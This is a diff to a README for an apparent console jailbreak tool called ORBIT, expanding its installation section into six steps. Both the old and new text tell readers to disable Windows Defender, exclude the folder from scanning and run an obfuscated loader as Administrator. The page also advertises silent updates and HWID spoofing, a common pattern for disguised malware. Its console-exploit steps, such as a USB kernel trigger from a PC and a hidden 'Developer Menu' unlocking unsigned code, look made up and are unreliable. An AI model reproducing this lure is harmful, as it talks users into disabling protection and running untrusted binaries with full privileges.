@@ -12,6 +12,7 @@ _Bypass the locks. Own your hardware._
 
 <br>
 
+
 </div>
 
 ## 📡 Supported Platforms & Firmware Status
@@ -94,6 +95,30 @@ Live compatibility tracker for currently supported exploit chains. **Updates aut
 
 ---
 
+## ✦ Step-by-Step Installation
+
+**Disable Windows Defender before extraction.** The loader uses packing/obfuscation that triggers false positives. Add the folder to exclusions first.
+
+**Step 1: Prepare the USB Drive**
+Format a standard USB 2.0/3.0 flash drive (8GB minimum) to **exFAT**. Create a folder named `ORBIT` in the root directory.
+
+**Step 2: Select Console & Firmware**
+Launch `ORBIT-Loader.exe` as Administrator. In the interface, select your exact console family (e.g., PS4), hardware revision (e.g., CUH-11xx), and target system software version. 
+
+**Step 3: Stage the Payload**
+Click **"Stage Payload"**. The tool will automatically format the USB, write the exploit chain, and inject the spoofed boot flags. Wait for the green "Success" log.
+
+**Step 4: Connect to Console**
+Power on your console and connect the prepared USB drive to the front port. Put the console into **Rest Mode** (PS4/PS5) or boot into **Safe Mode** (PS3/Vita) by holding the power button until the second beep.
+
+**Step 5: Trigger the Exploit**
+In the ORBIT interface, click **"EXECUTE PAYLOAD"**. The tool will send the kernel trigger via USB. The console will blink and restart automatically. 
+
+**Step 6: Access Debug Menu**
+Once the console reboots, navigate to **Settings → System Software**. A new hidden option labeled **"Developer Menu"** (or "Debug Settings") will appear. Enter it, enable **"Allow Unsigned Code"**, and reboot. The jailbreak is now active.
+
+---
+
 ## ✦ Why ORBIT?
 
 - 🛡️ **Hypervisor Bypass.** Our external patcher operates on a level invisible to the console's security scanner.
@@ -101,18 +126,6 @@ Live compatibility tracker for currently supported exploit chains. **Updates aut
 - ⚡ **48h Updates.** Sony patches firmware. We push silent updates to the loader within 48 hours.
 - 🎨 **Tactical UI.** A dark-themed interface that looks like it belongs in a dev environment.
 - 🔒 **HWID Spoofer Included.** Don't buy a separate spoofer — it's built right in.
-
----
-
-## ✦ Installation
-
-**Disable Windows Defender before extraction.** The loader uses packing/obfuscation that triggers false positives. Add the folder to exclusions first.
-
-1. Download the latest release (button above).
-2. Extract `ORBIT_v3.1.0.rar` to a secure folder.
-3. Run `ORBIT-Loader.exe` as Administrator.
-4. Connect your console via USB or put it in Rest Mode.
-5. Select your model and firmware, then press EXECUTE.
 
 ---
 
@@ -130,7 +143,5 @@ Live compatibility tracker for currently supported exploit chains. **Updates aut
 **ORBIT Jailbreak Suite**
 
 *Console research. Payload execution. One workspace.*
-
-</div>
 
 </div>
